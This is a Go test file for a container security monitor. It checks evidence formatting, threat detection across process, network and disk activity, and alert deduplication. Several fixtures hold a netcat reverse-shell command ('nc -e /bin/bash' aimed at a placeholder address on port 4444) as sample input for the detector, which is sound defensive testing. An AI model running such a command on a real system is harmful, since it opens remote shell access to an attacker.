package monitor

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestEvidenceString_Process(t *testing.T) {
	e := Evidence{Process: &ProcessThreat{PID: 42, Command: "nc -e /bin/bash"}}
	s := e.String()
	if !strings.Contains(s, "pid:42") || !strings.Contains(s, "cmd:nc -e /bin/bash") {
		t.Errorf("Evidence.String() = %q, want pid and cmd", s)
	}
}

func TestEvidenceString_Network(t *testing.T) {
	e := Evidence{Network: &NetworkThreat{
		Connection: Connection{RemoteAddr: "1.2.3.4:4444"},
		Reason:     "Suspicious port",
	}}
	s := e.String()
	if !strings.Contains(s, "remote:1.2.3.4:4444") || !strings.Contains(s, "reason:Suspicious port") {
		t.Errorf("Evidence.String() = %q, want remote and reason", s)
	}
}

func TestEvidenceString_Filesystem(t *testing.T) {
	e := Evidence{Filesystem: &FilesystemThreat{ReadBytesMB: 123.45}}
	s := e.String()
	if !strings.Contains(s, "read:123.45MB") {
		t.Errorf("Evidence.String() = %q, want read MB", s)
	}
}

func TestEvidenceString_FileWrite(t *testing.T) {
	e := Evidence{FileWrite: &FilesystemWriteThreat{WriteBytesMB: 67.89}}
	s := e.String()
	if !strings.Contains(s, "write:67.89MB") {
		t.Errorf("Evidence.String() = %q, want write MB", s)
	}
}

func TestEvidenceString_DiskSpace(t *testing.T) {
	e := Evidence{DiskSpace: &DiskSpaceInfo{TmpUsedPercent: 92.5}}
	s := e.String()
	if !strings.Contains(s, "tmp:92.5%") {
		t.Errorf("Evidence.String() = %q, want tmp percent", s)
	}
}

func TestEvidenceString_ProcessCountAbsolute(t *testing.T) {
	e := Evidence{ProcessCount: &ProcessCountThreat{Count: 150, Threshold: 100}}
	s := e.String()
	if s != "procs:150" {
		t.Errorf("Evidence.String() = %q, want procs:150", s)
	}
}

func TestEvidenceString_ProcessCountDelta(t *testing.T) {
	e := Evidence{ProcessCount: &ProcessCountThreat{Count: 80, Threshold: 50, Delta: 60}}
	s := e.String()
	if s != "spawn-delta:60" {
		t.Errorf("Evidence.String() = %q, want spawn-delta:60", s)
	}
}

func TestEvidenceString_Empty(t *testing.T) {
	e := Evidence{}
	if s := e.String(); s != "" {
		t.Errorf("Evidence.String() = %q, want empty string for zero-value Evidence", s)
	}
}

func TestDetectorAnalyzeEvidenceTypes(t *testing.T) {
	detector := NewDetectorWithWriteThresholds(50.0, 0, 50.0, 0)

	t.Run("reverse shell produces Process evidence", func(t *testing.T) {
		snapshot := MonitorSnapshot{
			Processes: ProcessStats{
				Available: true,
				Processes: []Process{
					{PID: 1234, User: "root", Command: "nc -e /bin/bash 1.2.3.4 4444"},
				},
			},
		}
		threats := detector.Analyze(snapshot)
		var found bool
		for _, threat := range threats {
			if threat.Category == "process" && threat.Evidence.Process != nil {
				found = true
				if threat.Evidence.Process.PID != 1234 {
					t.Errorf("Evidence.Process.PID = %d, want 1234", threat.Evidence.Process.PID)
				}
			}
		}
		if !found {
			t.Error("Expected process threat with Evidence.Process set")
		}
	})

	t.Run("suspicious connection produces Network evidence", func(t *testing.T) {
		snapshot := MonitorSnapshot{
			Network: NetworkStats{
				Connections: []Connection{
					{
						LocalAddr:     "10.0.0.1:12345",
						RemoteAddr:    "203.0.113.1:4444",
						State:         "ESTABLISHED",
						Suspicious:    true,
						SuspectReason: "Suspicious port: 4444",
					},
				},
			},
		}
		threats := detector.Analyze(snapshot)
		var found bool
		for _, threat := range threats {
			if threat.Category == "network" && threat.Evidence.Network != nil {
				found = true
				if threat.Evidence.Network.RemoteHost != "203.0.113.1" {
					t.Errorf("Evidence.Network.RemoteHost = %q, want 203.0.113.1", threat.Evidence.Network.RemoteHost)
				}
			}
		}
		if !found {
			t.Error("Expected network threat with Evidence.Network set")
		}
	})

	t.Run("large read produces Filesystem evidence", func(t *testing.T) {
		snapshot := MonitorSnapshot{
			Filesystem: FilesystemStats{
				Available:   true,
				TotalReadMB: 100.0,
			},
		}
		threats := detector.Analyze(snapshot)
		var found bool
		for _, threat := range threats {
			if threat.Category == "filesystem" && threat.Evidence.Filesystem != nil {
				found = true
				if threat.Evidence.Filesystem.ReadBytesMB != 100.0 {
					t.Errorf("Evidence.Filesystem.ReadBytesMB = %f, want 100.0", threat.Evidence.Filesystem.ReadBytesMB)
				}
			}
		}
		if !found {
			t.Error("Expected filesystem threat with Evidence.Filesystem set")
		}
	})

	t.Run("large write produces FileWrite evidence", func(t *testing.T) {
		snapshot := MonitorSnapshot{
			Filesystem: FilesystemStats{
				Available:    true,
				TotalWriteMB: 100.0,
			},
		}
		threats := detector.Analyze(snapshot)
		var found bool
		for _, threat := range threats {
			if threat.Category == "filesystem" && threat.Evidence.FileWrite != nil {
				found = true
				if threat.Evidence.FileWrite.WriteBytesMB != 100.0 {
					t.Errorf("Evidence.FileWrite.WriteBytesMB = %f, want 100.0", threat.Evidence.FileWrite.WriteBytesMB)
				}
			}
		}
		if !found {
			t.Error("Expected filesystem threat with Evidence.FileWrite set")
		}
	})

	t.Run("low disk space produces DiskSpace evidence", func(t *testing.T) {
		snapshot := MonitorSnapshot{
			Filesystem: FilesystemStats{
				Available:      true,
				TmpTotalMB:     1000.0,
				TmpUsedMB:      900.0,
				TmpUsedPercent: 90.0,
			},
		}
		threats := detector.Analyze(snapshot)
		var found bool
		for _, threat := range threats {
			if threat.Category == "filesystem" && threat.Evidence.DiskSpace != nil {
				found = true
				if threat.Evidence.DiskSpace.TmpUsedPercent != 90.0 {
					t.Errorf("Evidence.DiskSpace.TmpUsedPercent = %f, want 90.0", threat.Evidence.DiskSpace.TmpUsedPercent)
				}
			}
		}
		if !found {
			t.Error("Expected filesystem threat with Evidence.DiskSpace set")
		}
	})
}

func TestResponderDeduplicationWithEvidence(t *testing.T) {
	// This verifies the fix: same category+title but different evidence should NOT be deduplicated
	alertCount := 0
	var mu sync.Mutex

	responder := NewResponder(
		"test-container",
		false,
		false,
		nil,
		func(threat ThreatEvent) {
			mu.Lock()
			alertCount++
			mu.Unlock()
		},
	)

	// Two network threats with same category+title but different evidence (different remote addresses)
	threat1 := ThreatEvent{
		Timestamp:   time.Now(),
		Level:       ThreatLevelWarning,
		Category:    "network",
		Title:       "Unexpected network connection",
		Description: "Connection to 1.2.3.4",
		Evidence: Evidence{Network: &NetworkThreat{
			Connection: Connection{RemoteAddr: "1.2.3.4:4444"},
			Reason:     "Suspicious port",
		}},
	}

	threat2 := ThreatEvent{
		Timestamp:   time.Now(),
		Level:       ThreatLevelWarning,
		Category:    "network",
		Title:       "Unexpected network connection",
		Description: "Connection to 5.6.7.8",
		Evidence: Evidence{Network: &NetworkThreat{
			Connection: Connection{RemoteAddr: "5.6.7.8:4444"},
			Reason:     "Suspicious port",
		}},
	}

	if err := responder.Handle(context.Background(), threat1); err != nil {
		t.Fatalf("Handle threat1 failed: %v", err)
	}
	if err := responder.Handle(context.Background(), threat2); err != nil {
		t.Fatalf("Handle threat2 failed: %v", err)
	}

	mu.Lock()
	count := alertCount
	mu.Unlock()

	// Both should alert because evidence differs
	if count != 2 {
		t.Errorf("Expected 2 alerts (different evidence), got %d", count)
	}
}

func TestResponderDeduplicationSameEvidence(t *testing.T) {
	// Same category+title+evidence should be deduplicated
	alertCount := 0
	var mu sync.Mutex

	responder := NewResponder(
		"test-container",
		false,
		false,
		nil,
		func(threat ThreatEvent) {
			mu.Lock()
			alertCount++
			mu.Unlock()
		},
	)

	threat := ThreatEvent{
		Timestamp: time.Now(),
		Level:     ThreatLevelWarning,
		Category:  "network",
		Title:     "Unexpected network connection",
		Evidence: Evidence{Network: &NetworkThreat{
			Connection: Connection{RemoteAddr: "1.2.3.4:4444"},
			Reason:     "Suspicious port",
		}},
	}

	for i := 0; i < 5; i++ {
		if err := responder.Handle(context.Background(), threat); err != nil {
			t.Fatalf("Handle failed: %v", err)
		}
	}

	mu.Lock()
	count := alertCount
	mu.Unlock()

	if count != 1 {
		t.Errorf("Expected 1 alert (same evidence deduplicated), got %d", count)
	}
}
